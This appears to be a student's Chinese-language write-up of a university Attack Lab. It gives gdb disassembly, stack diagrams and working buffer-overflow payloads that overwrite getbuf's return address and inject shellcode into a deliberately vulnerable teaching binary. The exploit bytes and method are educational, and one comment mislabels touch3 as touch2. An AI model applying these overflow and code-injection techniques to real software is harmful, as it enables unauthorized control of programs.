# Attack Lab

## Part I: Code Injection Attacks

### Level 1
level 1 在 `test` 函式內，需要利用 `test` 內呼叫到的 `getbuf` 函式。
因為 `getbuf` 沒有作邊界檢查，可能造成 buffer overflow 的漏洞。
利用此處 buffer overflow 將 `getbuf` 的 return address 改寫成 `touch1` 函式的地址。

- test()
    ```
    (gdb) disass test
    Dump of assembler code for function test:
    0x0000000000401968 <+0>:	sub    $0x8,%rsp
    0x000000000040196c <+4>:	mov    $0x0,%eax
    0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
    0x0000000000401976 <+14>:	mov    %eax,%edx
    0x0000000000401978 <+16>:	mov    $0x403188,%esi
    0x000000000040197d <+21>:	mov    $0x1,%edi
    0x0000000000401982 <+26>:	mov    $0x0,%eax
    0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
    0x000000000040198c <+36>:	add    $0x8,%rsp
    0x0000000000401990 <+40>:	retq   
    End of assembler dump.
    ```

- getbuf()
    ```
    (gdb) disass getbuf
    Dump of assembler code for function getbuf:
    0x00000000004017a8 <+0>:	sub    $0x28,%rsp
    0x00000000004017ac <+4>:	mov    %rsp,%rdi
    0x00000000004017af <+7>:	callq  0x401a40 <Gets>
    0x00000000004017b4 <+12>:	mov    $0x1,%eax
    0x00000000004017b9 <+17>:	add    $0x28,%rsp
    0x00000000004017bd <+21>:	retq   
    End of assembler dump.
    ```

觀察進入 `getbuf` 時開出的 buffer 空間為 `0x28` (40byte)。
在輸入字串時在 40 byte 以後的內容以 little-endian 的順序寫入 `touch1` 的地址 (0x00000000004017c0)

- ctarget.l1.txt
    ```
    36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 36 c0 17 40 00 00 00 00 00
    ```

前 40Byte 為任意字串，後面加上 "c0 17 40 00 00 00 00 00" (`touch1` 的地址 - little-endian)

```
./hex2raw < ctarget.l1.txt | ./ctarget -q
```

在 `getbuf` 結束，成功跳轉到 `touch1`

### Level 2
與 level1 類似，需要讓程式執行 `touch2`，但在執行 `touch2` 之前需要將 cookie 寫入傳參 ($rdi) 才能通過。
所以我們可以注入一段程式碼，並且在 `touch2` 之前執行。

- ctargetl2.s
    ```
    pushq   $0x4017ec           # 先將 touch2 地址 push 進 stack
    mov     $0x59b997fa, %rdi   # 將 cookie 寫入 $rdi
    retq                        # return 回 $rsp 內儲存的位址 (touch2)
    ```

- 組譯後再反組譯得到 machine code
    ```
    $ gcc -c ctargetl2.s
    $ objdump -d ctargetl2.o > ctargetl2.d
    ```

- ctargetl2.d
    ```
    ctarget_l2/ctargetl2.o:     file format elf64-x86-64
    Disassembly of section .text:

    0000000000000000 <.text>:
        0:	68 ec 17 40 00       	pushq  $0x4017ec
        5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
        c:	c3                   	retq   
    ```


- ctarget.l2.txt
    ```
    68 ec 17 40 00 48 c7 c7 fa 97 b9 59 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
    ```

    |    |    |    |    |    |    |    |    |
    | -- | -- | -- | -- | -- | -- | -- | -- |
    | 00 | 00 | 00 | 00 | 55 | 61 | dc | 78 | <- $rsp : 0x5561dca0
    | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |
    | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |
    | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |
    | 00 | 00 | 00 | c3 | 59 | b9 | 97 | fa |
    | c7 | c7 | 48 | 00 | 40 | 17 | ec | 68 | <- getbuf : 0x5561dc78

    在結束 `getbuf` 後會先跳至 stack 段 (0x5561dc78) 執行注入的程式碼。先是將 `touch2` 地址 push 進 stack，再將 cookie 寫入傳參，最後 return 到 `touch2`。

### Level 3
與 level2 類似，`touch3` 傳參變為字串起始位址，但因為 `touch3` 內大量使用 stack 空間，會把 getbuf 注入的程式蓋寫，所以需要注入到 `test` 使用的 stack 區段才能躲過。

- cookie
    ```
    0x59b997fa
    ```
    ```
    35 39 62 39 39 37 66 61 00
    ```

- ctargetl3.s
    ```
    pushq   $0x4018fa           # 先將 touch2 地址 push 進 stack
    mov     $0x5561dca8, %rdi   # 將 cookie 字串的儲存位址寫入 $rdi
    retq                        # return 回 $rsp 內儲存的位址 (touch3)
    ```

- 組譯後再反組譯得到 machine code
    ```
    $ gcc -c ctargetl3.s
    $ objdump -d ctargetl3.o > ctargetl3.d
    ```

- ctargetl3.d
    ```
    ctarget_l3/ctargetl3.o:     file format elf64-x86-64
    Disassembly of section .text:
    
    0000000000000000 <.text>:
        0:	68 fa 18 40 00       	pushq  $0x4018fa
        5:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
        c:	c3                   	retq   
    ```

- ctarget.l3.txt
    ```
    68 fa 18 40 00 48 c7 c7 a8 dc 61 55 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
    ```
    |    |    |    |    |    |    |    |    |
    | -- | -- | -- | -- | -- | -- | -- | -- |
    | -- | -- | -- | -- | -- | -- | -- | 00 |
    | 61 | 66 | 37 | 39 | 39 | 62 | 39 | 35 | <- `test` 使用的 stack 區域
    | 00 | 00 | 00 | 00 | 55 | 61 | dc | 78 | <- $rsp : 0x5561dca0
    | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |
    | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |
    | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |
    | 00 | 00 | 00 | c3 | 55 | 61 | dc | a8 |
    | c7 | c7 | 48 | 00 | 40 | 18 | fa | 68 | <- getbuf : 0x5561dc78

